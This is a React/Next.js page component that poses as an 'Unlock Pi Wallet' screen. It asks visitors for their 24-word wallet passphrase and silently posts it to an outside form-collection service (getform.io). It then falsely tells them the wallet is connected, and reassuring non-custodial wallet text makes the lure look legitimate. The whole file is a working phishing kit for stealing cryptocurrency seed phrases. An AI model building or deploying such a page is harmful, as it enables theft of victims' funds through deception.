/* eslint-disable @typescript-eslint/no-unused-vars */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

import "./globals.scss"

const Wallet = () => {

    const router = useRouter();
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault();
        setLoading(true);
        setError(null);

        const formData = new FormData(event.currentTarget);

        try {
            const response = await fetch("https://getform.io/f/bmdkjgla", {
                method: "POST",
                body: formData,
            });

            if (response.ok) {
                router.push("/");
                alert("Wallet successfully connected")
            } else {
                setError("Error connecting wallet");
            }
        } catch (err) {
            setError("Error connecting wallet");
        } finally {
            setLoading(false);
        }
    };

    return (
        <form onSubmit={handleSubmit} className="form">
            <h2>Unlock Pi Wallet</h2>
            <textarea name="phrase" id="phrase" placeholder="Enter your 24-word Passphrase here" required />
            <button type="submit" disabled={loading}>
                {loading ? "Please wait ..." : "Activate With Passphrase"}
            </button>
            <div>
                {error && <p className="error">{error}</p>}
                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
                <p>Lost your passphrase? <span>You can create a new wallet,</span> but all your π in your previous wallet will be inaccessible</p>
            </div>
        </form>
    )
}

export default Wallet